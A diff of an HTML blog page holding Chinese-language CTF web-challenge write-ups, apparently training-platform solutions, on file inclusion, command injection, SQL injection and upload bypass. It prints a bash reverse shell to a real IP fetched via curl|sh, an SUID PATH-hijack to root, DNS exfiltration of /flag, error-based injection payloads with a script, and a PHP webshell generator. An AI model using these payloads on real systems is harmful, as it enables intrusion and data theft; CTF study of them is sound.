@@ -134,9 +134,9 @@
 <p>可以直接读取，再去试试根目录下的flag文件，提示你是偷粽子的。从匹配上看是只要存在flag这个词就不行。</p>
 <p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210922170335891.png" alt="image-20210922170335891"></p>
 <p>尝试利用远程包含，屏蔽了http关键词。file没有屏蔽，但是不能读取flag。那就尝试一下伪协议。</p>
-<p>php://input不给用，都会报错。</p>
+<p>php:&#x2F;&#x2F;input不给用，都会报错。</p>
 <p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210922171943816.png" alt="image-20210922171943816"></p>
-<p>尝试读取的命令php://filter</p>
+<p>尝试读取的命令php:&#x2F;&#x2F;filter</p>
 <pre class="line-numbers language-none"><code class="language-none">php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;.&#x2F;show.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210922172127683.png" alt="image-20210922172127683"></p>
@@ -195,7 +195,7 @@ if (isset($_GET[&#39;url&#39;])) &#123;
 <pre class="line-numbers language-none"><code class="language-none">&#x2F;sandbox&#x2F;8c2xxx9c5&#x2F;123.123<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210924101620908.png" alt="image-20210924101620908"></p>
-<h2 id="n1ctf-hard-php"><a href="#n1ctf-hard-php" class="headerlink" title="n1ctf/hard_php"></a>n1ctf/hard_php</h2><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210924141002836.png" alt="image-20210924141002836"></p>
+<h2 id="n1ctf-x2F-hard-php"><a href="#n1ctf-x2F-hard-php" class="headerlink" title="n1ctf&#x2F;hard_php"></a>n1ctf&#x2F;hard_php</h2><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210924141002836.png" alt="image-20210924141002836"></p>
 <p>一个登陆页面，按照惯例查看是否使用是文件包含读取，修改login为index，发现有登陆验证跳转，修改为</p>
 <pre class="line-numbers language-none"><code class="language-none">&#x2F;index.php?action&#x3D;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
@@ -233,33 +233,33 @@ if(isset($_GET[&#39;ip&#39;]))&#123;
 <p>flag并不在根目录，查看其他目录。没有发现其他可读目录下存在，那可能在root目录，需要一定的提权方式，这种读写的办法就不太适用了。</p>
 <p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210924154101831.png" alt="image-20210924154101831"></p>
 <p>想办法反弹一个shell出来，由于长度限制，此处不直接使用IP，转为十进制IP。利用如下</p>
-<pre class="md-fences mock-cm md-end-block" spellcheck="false" lang="" cid="n51" mdtype="fences">/?ip=curl+1093xxx907|sh<br/><br/>web服务使用flask搭建，写一个简单的返回。<br/>@app.route(&#39;/&#39;)<br/>def hello_world():<br/>    return &#39;bash -c &#34;bash -i &gt;&amp; /dev/tcp/65.49.209.99/8888 0&gt;&amp;1&#34;&#39;</pre>
+<pre class="md-fences mock-cm md-end-block" spellcheck="false" lang cid="n51" mdtype="fences">/?ip=curl+1093xxx907|sh<br><br>web服务使用flask搭建，写一个简单的返回。<br>@app.route(&#39;/&#39;)<br>def hello_world():<br>    return &#39;bash -c &#34;bash -i &gt;&amp; /dev/tcp/65.49.209.99/8888 0&gt;&amp;1&#34;&#39;</pre>
 
 <p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210924155033081.png" alt="image-20210924155033081"></p>
 <p>查找有没有可用的SUID</p>
-<pre class="md-fences mock-cm md-end-block" spellcheck="false" lang="" cid="n54" mdtype="fences">find / -perm -u=s -type f 2&gt;/dev/null</pre>
+<pre class="md-fences mock-cm md-end-block" spellcheck="false" lang cid="n54" mdtype="fences">find / -perm -u=s -type f 2&gt;/dev/null</pre>
 
 <p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210924155231086.png" alt="image-20210924155231086"></p>
 <p>其中有一个奇怪的love程序，执行后类似是PS的查看进程的结果。所以可能需要劫持PS命令来提取。</p>
-<pre class="md-fences mock-cm md-end-block" spellcheck="false" lang="" cid="n57" mdtype="fences">cd /tmp<br/>echo &#34;/bin/bash&#34; &gt; ps<br/>chmod 777 ps<br/>echo $PATH<br/>export PATH=/tmp:$PATH</pre>
+<pre class="md-fences mock-cm md-end-block" spellcheck="false" lang cid="n57" mdtype="fences">cd /tmp<br>echo &#34;/bin/bash&#34; &gt; ps<br>chmod 777 ps<br>echo $PATH<br>export PATH=/tmp:$PATH</pre>
 
 <p>再去执行love，即可调用当前tmp目录下的ps命令，获取到一个root的shell。</p>
 <p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210924160909016.png" alt="image-20210924160909016"></p>
 <p>其中demo.c应该就是love的源代码</p>
-<pre class="md-fences mock-cm md-end-block" spellcheck="false" lang="" cid="n61" mdtype="fences"># cat demo.c<br/><br/>#include&lt;unistd.h&gt;<br/>void main()<br/>{<br/>        setuid(0);<br/>        setgid(0);<br/>        system(&#34;ps&#34;);<br/>}</pre>
+<pre class="md-fences mock-cm md-end-block" spellcheck="false" lang cid="n61" mdtype="fences"># cat demo.c<br><br>#include&lt;unistd.h&gt;<br>void main()<br>{<br>        setuid(0);<br>        setgid(0);<br>        system(&#34;ps&#34;);<br>}</pre>
 
-<h2 id="流量监控平台"><a href="#流量监控平台" class="headerlink" title="流量监控平台"></a>流量监控平台</h2><p>WEb界面需要登陆，账号admin/123456登陆。</p>
+<h2 id="流量监控平台"><a href="#流量监控平台" class="headerlink" title="流量监控平台"></a>流量监控平台</h2><p>WEb界面需要登陆，账号admin&#x2F;123456登陆。</p>
 <p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210926100053004.png" alt="image-20210926100053004"></p>
 <p>可以执行命令，看样子是绕过命令执行。由于不回显，所以使用DNS外带的方式。先测试一下可能使用的命令，发现常用的命令不能使用，比如ping,curl等会报错，采用单引号分隔绕过黑名单。还在报错，测试发现是拦截了空格。使用%09绕过。</p>
-<pre class="md-fences mock-cm md-end-block" spellcheck="false" lang="" cid="n66" mdtype="fences">ord=ls;pi&#39;&#39;ng%09byvdxx.dnslog.cn</pre>
+<pre class="md-fences mock-cm md-end-block" spellcheck="false" lang cid="n66" mdtype="fences">ord=ls;pi&#39;&#39;ng%09byvdxx.dnslog.cn</pre>
 
 <p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210926100226721.png" alt="image-20210926100226721"></p>
 <p>发现可行，然后使用ceye的监听平台</p>
-<pre class="md-fences mock-cm md-end-block" spellcheck="false" lang="" cid="n69" mdtype="fences">ord=ls;pi&#39;&#39;ng%09`whoami`.xxxxb4.ceye.io</pre>
+<pre class="md-fences mock-cm md-end-block" spellcheck="false" lang cid="n69" mdtype="fences">ord=ls;pi&#39;&#39;ng%09`whoami`.xxxxb4.ceye.io</pre>
 
 <p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210926100350410.png" alt="image-20210926100350410"></p>
 <p>查看flag</p>
-<pre class="md-fences mock-cm md-end-block" spellcheck="false" lang="" cid="n72" mdtype="fences">ord=ls;pi&#39;&#39;ng%09`cat%09/flag`.r9rub4.ceye.io</pre>
+<pre class="md-fences mock-cm md-end-block" spellcheck="false" lang cid="n72" mdtype="fences">ord=ls;pi&#39;&#39;ng%09`cat%09/flag`.r9rub4.ceye.io</pre>
 
 <p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210926100456158.png" alt="image-20210926100456158"></p>
 <h2 id="rctf2015-easysql"><a href="#rctf2015-easysql" class="headerlink" title="rctf2015_easysql"></a>rctf2015_easysql</h2><p>打开是一个注册登陆页面，需要先注册个账号登陆，里面就是一些有的没得功能，还有一个修改密码。既然是注入，那就先把注册登陆看看有没有注入点，但是在注册的时候有过滤。</p>
@@ -269,38 +269,38 @@ if(isset($_GET[&#39;ip&#39;]))&#123;
 <p>登陆<code>admin%22%2f%2a</code>的时候，去修改密码功能，发现报错</p>
 <p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210926161510472.png" alt="image-20210926161510472"></p>
 <p>从报错上看SQL语句大概是</p>
-<pre class="md-fences mock-cm md-end-block" spellcheck="false" lang="" cid="n82" mdtype="fences">update user set pwd=&#34;xxxx&#34; where username=&#34;admin&#34;/*&#34; and pwd=&#39;698d51a19d8a121ce581499d7b701668&#39;;</pre>
+<pre class="md-fences mock-cm md-end-block" spellcheck="false" lang cid="n82" mdtype="fences">update user set pwd=&#34;xxxx&#34; where username=&#34;admin&#34;/*&#34; and pwd=&#39;698d51a19d8a121ce581499d7b701668&#39;;</pre>
 
 <p>构造一个报错语句</p>
-<pre class="md-fences mock-cm md-end-block" spellcheck="false" lang="" cid="n84" mdtype="fences">username=1&#34;and (updatexml(1,concat(0x7e,(select user()),0x7e),1))#</pre>
+<pre class="md-fences mock-cm md-end-block" spellcheck="false" lang cid="n84" mdtype="fences">username=1&#34;and (updatexml(1,concat(0x7e,(select user()),0x7e),1))#</pre>
 
 <p>但是上面这个语句并不能使用，其中有空格和and符，修改为如下：</p>
-<pre class="md-fences mock-cm md-end-block" spellcheck="false" lang="" cid="n86" mdtype="fences">username=1&#34;%26%26(updatexml(1,concat(0x7e,(select%0buser()),0x7e),1))#</pre>
+<pre class="md-fences mock-cm md-end-block" spellcheck="false" lang cid="n86" mdtype="fences">username=1&#34;%26%26(updatexml(1,concat(0x7e,(select%0buser()),0x7e),1))#</pre>
 
 <p>登陆再去修改密码，发现可以正常执行，那就查库查表查字段一条龙服务。</p>
 <p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210926162235294.png" alt="image-20210926162235294"></p>
 <p>当前库web_sqli</p>
-<pre class="md-fences mock-cm md-end-block" spellcheck="false" lang="" cid="n90" mdtype="fences">username=1&#34;%26%26(updatexml(1,concat(0x7e,(select%0bdatabase()),0x7e),1))#</pre>
+<pre class="md-fences mock-cm md-end-block" spellcheck="false" lang cid="n90" mdtype="fences">username=1&#34;%26%26(updatexml(1,concat(0x7e,(select%0bdatabase()),0x7e),1))#</pre>
 
 <p>查看库内的表，正好第一次就是flag表</p>
-<pre class="md-fences mock-cm md-end-block" spellcheck="false" lang="" cid="n92" mdtype="fences">username=1&#34;%26%26(updatexml(1,(select%0bconcat(0x7e,(table_name),0x7e)%0bfrom%0binformation_schema.tables%0bwhere%0btable_schema=&#39;web_sqli&#39;%0blimit%0b1,1),1))#</pre>
+<pre class="md-fences mock-cm md-end-block" spellcheck="false" lang cid="n92" mdtype="fences">username=1&#34;%26%26(updatexml(1,(select%0bconcat(0x7e,(table_name),0x7e)%0bfrom%0binformation_schema.tables%0bwhere%0btable_schema=&#39;web_sqli&#39;%0blimit%0b1,1),1))#</pre>
 
 <p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210926163153625.png" alt="image-20210926163153625"></p>
 <p>查看字段，就存在一个flag字段</p>
-<pre class="md-fences mock-cm md-end-block" spellcheck="false" lang="" cid="n95" mdtype="fences">1&#34;%26%26(updatexml(1,(select%0bconcat(0x7e,(column_name),0x7e)%0bfrom%0binformation_schema.columns%0bwhere%0btable_name=&#39;flag&#39;%0blimit%0b0,1),1))#</pre>
+<pre class="md-fences mock-cm md-end-block" spellcheck="false" lang cid="n95" mdtype="fences">1&#34;%26%26(updatexml(1,(select%0bconcat(0x7e,(column_name),0x7e)%0bfrom%0binformation_schema.columns%0bwhere%0btable_name=&#39;flag&#39;%0blimit%0b0,1),1))#</pre>
 
 <p>查看字段值，显示<code>RCTF&#123;Good job! But flag not her</code>，啊这。。。</p>
-<pre class="md-fences mock-cm md-end-block" spellcheck="false" lang="" cid="n97" mdtype="fences">1&#34;%26%26(updatexml(1,(select%0bconcat(0x7e,flag,0x7e)from%0bflag%0blimit%0b0,1)%0b,1))#</pre>
+<pre class="md-fences mock-cm md-end-block" spellcheck="false" lang cid="n97" mdtype="fences">1&#34;%26%26(updatexml(1,(select%0bconcat(0x7e,flag,0x7e)from%0bflag%0blimit%0b0,1)%0b,1))#</pre>
 
 <p>懂了，那个flag表是骗人的。再查询一遍还有article表和users表，用users表来查找。终于在字段中查到一个<code>real_flag_1s_here</code></p>
-<pre class="md-fences mock-cm md-end-block" spellcheck="false" lang="" cid="n99" mdtype="fences">1&#34;%26%26(updatexml(1,(select%0bconcat(0x7e,(column_name),0x7e)%0bfrom%0binformation_schema.columns%0bwhere%0btable_name=&#39;users&#39;%0blimit%0b3,1),1))#</pre>
+<pre class="md-fences mock-cm md-end-block" spellcheck="false" lang cid="n99" mdtype="fences">1&#34;%26%26(updatexml(1,(select%0bconcat(0x7e,(column_name),0x7e)%0bfrom%0binformation_schema.columns%0bwhere%0btable_name=&#39;users&#39;%0blimit%0b3,1),1))#</pre>
 
 <p>再来查看字段值，limit查看都是一个个xxx，直接聚合输出</p>
-<pre class="md-fences mock-cm md-end-block" spellcheck="false" lang="" cid="n101" mdtype="fences">1&#34;%26%26(updatexml(1,(select%0bconcat(0x7e,(select%0bgroup_concat(real_flag_1s_here)from%0busers),0x7e))%0b,1))#</pre>
+<pre class="md-fences mock-cm md-end-block" spellcheck="false" lang cid="n101" mdtype="fences">1&#34;%26%26(updatexml(1,(select%0bconcat(0x7e,(select%0bgroup_concat(real_flag_1s_here)from%0busers),0x7e))%0b,1))#</pre>
 
 <p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210926165906689.png" alt="image-20210926165906689"></p>
 <p>啊这。。。好家伙，不够长的。。。那就还是一个个输出，先用Intruder批量注册。然后用下面的脚本查看。</p>
-<pre class="md-fences mock-cm md-end-block" spellcheck="false" lang="" cid="n104" mdtype="fences">#coding:utf-8<br/><br/>import requests<br/>import re<br/><br/>headers = {<br/>    &#39;Content-Type&#39;: &#39;application/x-www-form-urlencoded&#39;,<br/>    &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36&#39;,<br/>    &#39;Accept&#39;: &#39;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&#39;,<br/>    &#39;Referer&#39;: &#39;http://www.bmzclub.cn:22937/changepwd.php&#39;,<br/>    &#39;Accept-Encoding&#39;: &#39;gzip, deflate&#39;,<br/>    &#39;Accept-Language&#39;: &#39;zh-CN,zh;q=0.9,en;q=0.8&#39;,<br/>    &#39;Cookie&#39;: &#39;Hm_lvt_d7a3b863d5a302676afbe86b11339abd=1631932461,1632274696,1632620435; session=5424329c-1b2e-4349-b4e1-0d2f55c408c5; PHPSESSID=1h1clgvbkvn31qbng29c0m8mr6; Hm_lpvt_d7a3b863d5a302676afbe86b11339abd=1632637433; td_cookie=468906102&#39;<br/>}<br/><br/>for i in range(1, 21):<br/>    data = &#39;username=1&#34;%26%26(updatexml(1,concat(0x7e,(select%0breal_flag_1s_here%0bfrom%0busers%0blimit%0b{id},1),0x7e),1))#&amp;password=111&#39;.format(id=str(i))<br/>    r = requests.post(&#39;http://www.bmzclub.cn:22937/login.php&#39;, headers=headers, data=data)<br/>    <br/>    r = requests.post(&#39;http://www.bmzclub.cn:22937/changepwd.php&#39;, headers=headers, data=&#34;oldpass=111&amp;newpass=111&#34;)<br/>    print(re.findall(&#39;XPATH syntax error: (.*)&#39;, r.text))<br/></pre>
+<pre class="md-fences mock-cm md-end-block" spellcheck="false" lang cid="n104" mdtype="fences">#coding:utf-8<br><br>import requests<br>import re<br><br>headers = {<br>	&#39;Content-Type&#39;: &#39;application/x-www-form-urlencoded&#39;,<br>	&#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36&#39;,<br>	&#39;Accept&#39;: &#39;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&#39;,<br>	&#39;Referer&#39;: &#39;http://www.bmzclub.cn:22937/changepwd.php&#39;,<br>	&#39;Accept-Encoding&#39;: &#39;gzip, deflate&#39;,<br>	&#39;Accept-Language&#39;: &#39;zh-CN,zh;q=0.9,en;q=0.8&#39;,<br>	&#39;Cookie&#39;: &#39;Hm_lvt_d7a3b863d5a302676afbe86b11339abd=1631932461,1632274696,1632620435; session=5424329c-1b2e-4349-b4e1-0d2f55c408c5; PHPSESSID=1h1clgvbkvn31qbng29c0m8mr6; Hm_lpvt_d7a3b863d5a302676afbe86b11339abd=1632637433; td_cookie=468906102&#39;<br>}<br><br>for i in range(1, 21):<br>	data = &#39;username=1&#34;%26%26(updatexml(1,concat(0x7e,(select%0breal_flag_1s_here%0bfrom%0busers%0blimit%0b{id},1),0x7e),1))#&amp;password=111&#39;.format(id=str(i))<br>	r = requests.post(&#39;http://www.bmzclub.cn:22937/login.php&#39;, headers=headers, data=data)<br>	<br>	r = requests.post(&#39;http://www.bmzclub.cn:22937/changepwd.php&#39;, headers=headers, data=&#34;oldpass=111&amp;newpass=111&#34;)<br>	print(re.findall(&#39;XPATH syntax error: (.*)&#39;, r.text))<br></pre>
 
 <p>结果全是<code>xxx</code>，啊这，给孩子整不会了。这难道就是0 Solver的原因？</p>
 <h2 id="TCTF2019-Wallbreaker-Easy"><a href="#TCTF2019-Wallbreaker-Easy" class="headerlink" title="TCTF2019_Wallbreaker_Easy"></a>TCTF2019_Wallbreaker_Easy</h2><p>提示如下</p>
@@ -311,20 +311,20 @@ if(isset($_GET[&#39;ip&#39;]))&#123;
 <p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210927105430695.png" alt="image-20210927105430695"></p>
 <h2 id="insomniteaser-2019-l33t-hoster"><a href="#insomniteaser-2019-l33t-hoster" class="headerlink" title="insomniteaser_2019_l33t_hoster"></a>insomniteaser_2019_l33t_hoster</h2><p>此问题并没有正确解出，本来使用大小写后缀外加图片马来绕过限制，但是发现并不会当作php执行。所以此处使用WP复现</p>
 <p>首先是代码</p>
-<pre class="md-fences mock-cm md-end-block" spellcheck="false" lang="" cid="n116" mdtype="fences">$disallowed_ext = array(<br/>    &#34;php&#34;,<br/>    &#34;php3&#34;,<br/>    &#34;php4&#34;,<br/>    &#34;php5&#34;,<br/>    &#34;php7&#34;,<br/>    &#34;pht&#34;,<br/>    &#34;phtm&#34;,<br/>    &#34;phtml&#34;,<br/>    &#34;phar&#34;,<br/>    &#34;phps&#34;,<br/>);<br/><br/><br/>if (isset($_POST[&#34;upload&#34;])) {<br/>    if ($_FILES[&#39;image&#39;][&#39;error&#39;] !== UPLOAD_ERR_OK) {<br/>        die(&#34;yuuuge fail&#34;);<br/>    }<br/><br/>    $tmp_name = $_FILES[&#34;image&#34;][&#34;tmp_name&#34;];<br/>    $name = $_FILES[&#34;image&#34;][&#34;name&#34;];<br/>    $parts = explode(&#34;.&#34;, $name);<br/>    $ext = array_pop($parts);<br/><br/>    if (empty($parts[0])) {<br/>        array_shift($parts);<br/>    }<br/><br/>    if (count($parts) === 0) {<br/>        die(&#34;lol filename is empty&#34;);<br/>    }<br/><br/>    if (in_array($ext, $disallowed_ext, TRUE)) {<br/>        die(&#34;lol nice try, but im not stupid dude...&#34;);<br/>    }<br/><br/>    $image = file_get_contents($tmp_name);<br/>    if (mb_strpos($image, &#34;&lt;?&#34;) !== FALSE) {<br/>        die(&#34;why would you need php in a pic.....&#34;);<br/>    }<br/><br/>    if (!exif_imagetype($tmp_name)) {<br/>        die(&#34;not an image.&#34;);<br/>    }<br/><br/>    $image_size = getimagesize($tmp_name);<br/>    if ($image_size[0] !== 1337 || $image_size[1] !== 1337) {<br/>        die(&#34;lol noob, your pic is not l33t enough&#34;);<br/>    }<br/><br/>    $name = implode(&#34;.&#34;, $parts);<br/>    move_uploaded_file($tmp_name, $userdir . $name . &#34;.&#34; . $ext);<br/>}</pre>
+<pre class="md-fences mock-cm md-end-block" spellcheck="false" lang cid="n116" mdtype="fences">$disallowed_ext = array(<br>    &#34;php&#34;,<br>    &#34;php3&#34;,<br>    &#34;php4&#34;,<br>    &#34;php5&#34;,<br>    &#34;php7&#34;,<br>    &#34;pht&#34;,<br>    &#34;phtm&#34;,<br>    &#34;phtml&#34;,<br>    &#34;phar&#34;,<br>    &#34;phps&#34;,<br>);<br><br><br>if (isset($_POST[&#34;upload&#34;])) {<br>    if ($_FILES[&#39;image&#39;][&#39;error&#39;] !== UPLOAD_ERR_OK) {<br>        die(&#34;yuuuge fail&#34;);<br>    }<br><br>    $tmp_name = $_FILES[&#34;image&#34;][&#34;tmp_name&#34;];<br>    $name = $_FILES[&#34;image&#34;][&#34;name&#34;];<br>    $parts = explode(&#34;.&#34;, $name);<br>    $ext = array_pop($parts);<br><br>    if (empty($parts[0])) {<br>        array_shift($parts);<br>    }<br><br>    if (count($parts) === 0) {<br>        die(&#34;lol filename is empty&#34;);<br>    }<br><br>    if (in_array($ext, $disallowed_ext, TRUE)) {<br>        die(&#34;lol nice try, but im not stupid dude...&#34;);<br>    }<br><br>    $image = file_get_contents($tmp_name);<br>    if (mb_strpos($image, &#34;&lt;?&#34;) !== FALSE) {<br>        die(&#34;why would you need php in a pic.....&#34;);<br>    }<br><br>    if (!exif_imagetype($tmp_name)) {<br>        die(&#34;not an image.&#34;);<br>    }<br><br>    $image_size = getimagesize($tmp_name);<br>    if ($image_size[0] !== 1337 || $image_size[1] !== 1337) {<br>        die(&#34;lol noob, your pic is not l33t enough&#34;);<br>    }<br><br>    $name = implode(&#34;.&#34;, $parts);<br>    move_uploaded_file($tmp_name, $userdir . $name . &#34;.&#34; . $ext);<br>}</pre>
 
 <p>黑名单限制文件后缀，本来看到in_array中带了true，还以为是大小写绕过。实际是使用htaccess文件来定义文件解析类型。</p>
 <p>上传.htaccess文件。此处由于会对文件名做处理，所以需要使用..htaccess文件来绕过执行，使得能正确保存文件。</p>
-<pre class="md-fences mock-cm md-end-block" spellcheck="false" lang="" cid="n119" mdtype="fences">    $parts = explode(&#34;.&#34;, $name);    #Array([0] =&gt;  [1] =&gt;  [2] =&gt; htaccess)<br/>    $ext = array_pop($parts);        #htaccess<br/><br/>    if (empty($parts[0])) {          #true<br/>        array_shift($parts);          #返回删除的&#39;&#39;，还剩$parts[1] =&gt; &#39;&#39;<br/>    }<br/><br/>    if (count($parts) === 0) {        #false  count=1<br/>        die(&#34;lol filename is empty&#34;);<br/>    }<br/>    .....<br/>    $name = implode(&#34;.&#34;, $parts);     #返回空，所以后续拼接的时候就是$userdir . &#34;.&#34; . $ext<br/></pre>
+<pre class="md-fences mock-cm md-end-block" spellcheck="false" lang cid="n119" mdtype="fences">	$parts = explode(&#34;.&#34;, $name);    #Array([0] =&gt;  [1] =&gt;  [2] =&gt; htaccess)<br>    $ext = array_pop($parts);        #htaccess<br><br>    if (empty($parts[0])) {          #true<br>        array_shift($parts);          #返回删除的&#39;&#39;，还剩$parts[1] =&gt; &#39;&#39;<br>    }<br><br>    if (count($parts) === 0) {        #false  count=1<br>        die(&#34;lol filename is empty&#34;);<br>    }<br>    .....<br>    $name = implode(&#34;.&#34;, $parts);     #返回空，所以后续拼接的时候就是$userdir . &#34;.&#34; . $ext<br></pre>
 
 <p>剩下的就是图片大小的问题，WP采用的图片格式为XBM格式，一种纯文本二进制图像格式，用于存储X GUI中使用的光标和图标位图。</p>
 <p>前两个#defines指定位图的高度和宽度（以像素为单位），比如以下xbm文件：</p>
-<pre class="md-fences mock-cm md-end-block" spellcheck="false" lang="" cid="n122" mdtype="fences">#define test_width 16<br/>#define test_height 7<br/>static char test_bits[] = {<br/>0x13, 0x00, 0x15, 0x00, 0x93, 0xcd, 0x55, 0xa5, 0x93, 0xc5, 0x00, 0x80,<br/>0x00, 0x60 };</pre>
+<pre class="md-fences mock-cm md-end-block" spellcheck="false" lang cid="n122" mdtype="fences">#define test_width 16<br>#define test_height 7<br>static char test_bits[] = {<br>0x13, 0x00, 0x15, 0x00, 0x93, 0xcd, 0x55, 0xa5, 0x93, 0xc5, 0x00, 0x80,<br>0x00, 0x60 };</pre>
 
 <p>后续就是绕过<code>&lt;?</code>这种过滤，WP解释由于使用PHP7.2，所以<code>&lt;script&gt;</code>指定语言的方式不能使用，这个没看出来PHP的版本。采用UTF-16大端编码格式，用一张图表示,utf-8一个字符一个字节，现在utf-16是两个字节编码一个字符。</p>
 <p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/1063309-20190718173949769-1098882942.png"></p>
 <p>所以利用如下脚本生成</p>
-<pre class="md-fences mock-cm md-end-block" spellcheck="false" lang="" cid="n126" mdtype="fences">#!/usr/bin/python3<br/><br/>SIZE_HEADER = b&#34;\n\n#define width 1337\n#define height 1337\n\n&#34;<br/><br/>def generate_php_file(filename, script):<br/>    phpfile = open(filename, &#39;wb&#39;) <br/><br/>    phpfile.write(script.encode(&#39;utf-16be&#39;))<br/>    phpfile.write(SIZE_HEADER)<br/><br/>    phpfile.close()<br/><br/>def generate_htacess():<br/>    htaccess = open(&#39;..htaccess&#39;, &#39;wb&#39;)<br/>    htaccess.write(SIZE_HEADER)<br/>    htaccess.write(b&#39;AddType application/x-httpd-php .php16\n&#39;)<br/>    htaccess.write(b&#39;php_value zend.multibyte 1\n&#39;)<br/>    htaccess.write(b&#39;php_value zend.detect_unicode 1\n&#39;)<br/>    htaccess.write(b&#39;php_value display_errors 1\n&#39;)<br/>    htaccess.close()<br/>        <br/>generate_htacess()<br/><br/>generate_php_file(&#34;webshell.php16&#34;, &#34;&lt;?php system($_GET[&#39;cmd&#39;]);?&gt;&#34;)<br/>generate_php_file(&#34;scandir.php16&#34;, &#34;&lt;?php echo implode(&#39;\n&#39;, scandir($_GET[&#39;dir&#39;]));?&gt;&#34;)</pre>
+<pre class="md-fences mock-cm md-end-block" spellcheck="false" lang cid="n126" mdtype="fences">#!/usr/bin/python3<br><br>SIZE_HEADER = b&#34;\n\n#define width 1337\n#define height 1337\n\n&#34;<br><br>def generate_php_file(filename, script):<br>    phpfile = open(filename, &#39;wb&#39;) <br><br>    phpfile.write(script.encode(&#39;utf-16be&#39;))<br>    phpfile.write(SIZE_HEADER)<br><br>    phpfile.close()<br><br>def generate_htacess():<br>    htaccess = open(&#39;..htaccess&#39;, &#39;wb&#39;)<br>    htaccess.write(SIZE_HEADER)<br>    htaccess.write(b&#39;AddType application/x-httpd-php .php16\n&#39;)<br>    htaccess.write(b&#39;php_value zend.multibyte 1\n&#39;)<br>    htaccess.write(b&#39;php_value zend.detect_unicode 1\n&#39;)<br>    htaccess.write(b&#39;php_value display_errors 1\n&#39;)<br>    htaccess.close()<br>        <br>generate_htacess()<br><br>generate_php_file(&#34;webshell.php16&#34;, &#34;&lt;?php system($_GET[&#39;cmd&#39;]);?&gt;&#34;)<br>generate_php_file(&#34;scandir.php16&#34;, &#34;&lt;?php echo implode(&#39;\n&#39;, scandir($_GET[&#39;dir&#39;]));?&gt;&#34;)</pre>
 
 <p>由于设置了diable，所以不能执行命令，如果需要考虑绕过的形式，可以利用蚁剑来直接执行。或者利用文件读取的shell。直接读取flag。</p>
 <h2 id="2018网鼎杯Comment"><a href="#2018网鼎杯Comment" class="headerlink" title="2018网鼎杯Comment"></a>2018网鼎杯Comment</h2><p>打开页面是一个留言板，留言会显示需要登陆，已经给了一个账号，zhangwei，但是密码不对，既然给了一个账号那就爆破一下密码，发现常规密码都不对，再次看密码格式三个星号可能代表需要爆破这三位？</p>
@@ -333,55 +333,55 @@ if(isset($_GET[&#39;ip&#39;]))&#123;
 <p>试了一圈发现不太行，可能是需要组合利用，那还需要源代码查看。扫描一下目录。</p>
 <p>发现一堆git泄露，好家伙在这等我呢。</p>
 <p>找到一个write_do.php文件。</p>
-<pre class="md-fences mock-cm md-end-block" spellcheck="false" lang="php" cid="n135" mdtype="fences">&lt;?php<br/>include &#34;mysql.php&#34;;<br/>session_start();<br/>if($_SESSION[&#39;login&#39;] != &#39;yes&#39;){<br/>    header(&#34;Location: ./login.php&#34;);<br/>    die();<br/>}<br/>if(isset($_GET[&#39;do&#39;])){<br/>switch ($_GET[&#39;do&#39;])<br/>{<br/>case &#39;write&#39;:<br/>    $category = addslashes($_POST[&#39;category&#39;]);<br/>    $title = addslashes($_POST[&#39;title&#39;]);<br/>    $content = addslashes($_POST[&#39;content&#39;]);<br/>    $sql = &#34;insert into board<br/>            set category = &#39;$category&#39;,<br/>                title = &#39;$title&#39;,<br/>                content = &#39;$content&#39;&#34;;<br/>    $result = mysql_query($sql);<br/>    header(&#34;Location: ./index.php&#34;);<br/>    break;<br/>case &#39;comment&#39;:<br/>    $bo_id = addslashes($_POST[&#39;bo_id&#39;]);<br/>    $sql = &#34;select category from board where id=&#39;$bo_id&#39;&#34;;<br/>    $result = mysql_query($sql);<br/>    $num = mysql_num_rows($result);<br/>    if($num&gt;0){<br/>    $category = mysql_fetch_array($result)[&#39;category&#39;];<br/>    $content = addslashes($_POST[&#39;content&#39;]);<br/>    $sql = &#34;insert into comment<br/>            set category = &#39;$category&#39;,<br/>                content = &#39;$content&#39;,<br/>                bo_id = &#39;$bo_id&#39;&#34;;<br/>    $result = mysql_query($sql);<br/>    }<br/>    header(&#34;Location: ./comment.php?id=$bo_id&#34;);<br/>    break;<br/>default:<br/>    header(&#34;Location: ./index.php&#34;);<br/>}<br/>}<br/>else{<br/>    header(&#34;Location: 